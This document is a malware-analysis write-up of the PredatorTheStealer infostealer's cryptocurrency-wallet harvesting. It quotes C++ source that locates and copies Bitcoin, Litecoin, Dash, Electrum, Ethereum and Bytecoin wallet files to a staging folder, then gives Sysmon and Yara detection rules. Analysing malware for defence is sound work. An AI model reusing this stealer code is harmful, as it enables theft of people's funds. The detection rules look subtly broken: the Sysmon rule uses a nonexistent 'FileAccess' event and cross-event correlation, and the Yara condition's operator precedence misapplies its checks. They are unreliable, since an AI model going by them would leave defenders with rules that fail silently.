# PredatorTheStealer - Multi-Wallet Cryptocurrency Harvesting

**Repository:** `MalwareSourceCode-main`  
**File:** `Win32/Stealers/Win32.PredatorTheStealer.b/Win32.PredatorTheStealer.b/PredatorTheStealer/Stealing.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1552.001 (Unsecured Credentials), T1005 (Data from Local System), T1083 (File and Directory Discovery)

## Overview

PredatorTheStealer is a C++ based information stealer that implements comprehensive cryptocurrency wallet harvesting. It demonstrates a dual-pronged approach to locating and stealing wallet data, targeting over nine different cryptocurrency applications. By combining registry queries with hardcoded path scanning, it maximizes its chances of finding valuable wallet files, which are often unencrypted or weakly protected by users. The stolen files are then staged for exfiltration.

## Code Snippet & Analysis

PredatorTheStealer splits its wallet-hunting logic into two primary functions: one for discovering paths via the registry and another for checking well-known hardcoded paths.

### 1. Registry-Based Wallet Discovery (`GetWalletsReg`)

This function queries the `HKEY_CURRENT_USER` registry hive for keys associated with specific cryptocurrency clients to find their data directories.

```cpp
void Stealing::GetWalletsReg(const string & output_dir)
{
	string wallet_path = "";
	HKEY hkey;

	// --- Bitcoin ---
	RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Bitcoin\\Bitcoin-Qt", &hkey);
	GetStringRegKeyA(hkey, "strDataDir", wallet_path, "ERR");
	if (wallet_path != "ERR")
		File.Copy(wallet_path + "\\wallet.dat", output_dir + "\\bitcoin.dat");
	
	// --- Litecoin ---
	RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Litecoin\\Litecoin-Qt", &hkey);
	GetStringRegKeyA(hkey, "strDataDir", wallet_path, "ERR");
	if (wallet_path != "ERR")
		File.Copy(wallet_path + "\\wallet.dat", output_dir + "\\litecoin.dat");

	// --- Dash ---
	RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Dash\\Dash-Qt", &hkey);
	GetStringRegKeyA(hkey, "strDataDir", wallet_path, "ERR");
	if (wallet_path != "ERR")
		File.Copy(wallet_path + "\\wallet.dat", output_dir + "\\dashcoin.dat");
    
    // ... (and others)
}
```

### 2. Hardcoded Path-Based Wallet Discovery (`GetWalletsPath`)

This function targets wallets that consistently store data in the user's `%APPDATA%` directory, using hardcoded sub-directory names.

```cpp
void Stealing::GetWalletsPath(const string & output_dir)
{
	const string appdata_path = (string)getenv("appdata");

	// Electrum (Bitcoin SPV wallet) - Copies all files from the 'wallets' directory
	CopyByMask(appdata_path + "\\Electrum\\wallets", "*", output_dir, true);

	// Ethereum (Geth/Mist wallet) - Copies the entire 'keystore' directory
	CopyByMask(appdata_path + "\\Ethereum\\keystore", "*", output_dir, true);

	// Bytecoin (CryptoNote-based privacy coin) - Copies all '.wallet' files
	CopyByMask(appdata_path + "\\bytecoin", "*.wallet", output_dir, true);
}
```

### What it does:

1.  **Registry Discovery:** The `GetWalletsReg` function systematically opens registry keys for Bitcoin, Litecoin, and Dash. If a key exists, it reads the `strDataDir` value, which contains the path to the user's data directory. It then constructs the full path to `wallet.dat` and copies it to a staging directory.
2.  **Hardcoded Path Discovery:** The `GetWalletsPath` function gets the `%APPDATA%` environment variable and appends known wallet directory names like `\Electrum\wallets` and `\Ethereum\keystore`.
3.  **Wildcard Copying:** It uses a helper function, `CopyByMask`, to copy all files (`*`) or specific patterns (`*.wallet`) from the discovered directories to a staging location (`output_dir`). This ensures it grabs not just the primary wallet file but also any associated key or transaction files.

### Why it's a TTP:

This code is a clear implementation of **T1552.001 - Unsecured Credentials: Credentials In Files** and **T1005 - Data from Local System**. The malware is not exploiting a software vulnerability but is instead abusing the fact that cryptocurrency wallets are fundamentally files stored on the local system. By actively searching for these files in both predictable (hardcoded) and configurable (registry) locations, the attacker automates the collection of high-value credentials. The use of two distinct methods demonstrates a robust and resilient approach to finding the target data.

## Detection & Evasion

### Sysmon Rule

A Sysmon rule can detect this activity by correlating registry reads for known wallet paths with subsequent file access to `wallet.dat`.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="PredatorTheStealer Wallet Hunting" groupRelation="and">
            <RegistryEvent onmatch="include">
                <!-- Rule to detect reading of wallet data directory paths from the registry -->
                <TargetObject condition="contains any">
                    \Software\Bitcoin\Bitcoin-Qt;
                    \Software\Litecoin\Litecoin-Qt;
                    \Software\Dash\Dash-Qt;
                    \Software\monero-project\monero-core
                </TargetObject>
                <EventType>QueryValue</EventType>
            </RegistryEvent>
            <FileAccess onmatch="include">
                <!-- Correlate with subsequent access to the wallet.dat file -->
                <TargetFilename condition="end with">\wallet.dat</TargetFilename>
            </FileAccess>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This rule is designed to be high-fidelity by requiring both the registry read and the file access to trigger. It may still generate false positives from legitimate wallet management tools or backup scripts.

### Yara Rule

A Yara rule can effectively detect PredatorTheStealer binaries by searching for the unique combination of hardcoded registry keys and file paths.

```yara
rule TTP_PredatorTheStealer_Wallet_Harvest
{
    meta:
        author = "GitHub Copilot"
        description = "Detects PredatorTheStealer and variants by searching for a combination of hardcoded cryptocurrency wallet registry keys and file paths."
        mitre_ttp = "T1552.001"
        malware = "PredatorTheStealer"
    strings:
        // Registry Keys
        $reg1 = "Software\\Bitcoin\\Bitcoin-Qt" wide ascii
        $reg2 = "Software\\Litecoin\\Litecoin-Qt" wide ascii
        $reg3 = "Software\\Dash\\Dash-Qt" wide ascii
        
        // File Paths
        $path1 = "\\Electrum\\wallets" wide ascii
        $path2 = "\\Ethereum\\keystore" wide ascii
        $path3 = "\\bytecoin" wide ascii
        $path4 = "wallet.dat" wide ascii

        // String Obfuscation Artifact
        $xor = "XorStr" wide ascii

    condition:
        uint16(0) == 0x5a4d and // PE file
        (2 of ($reg*) and 2 of ($path*)) or
        (all of ($reg*)) or
        (all of ($path1, $path2, $path3)) and $xor
}
```
**Note:** The condition is flexible. It triggers if it sees a few registry keys and a few file paths, or all of the keys, or all of the primary paths in conjunction with the `XorStr` artifact, which is a strong indicator of this specific codebase.

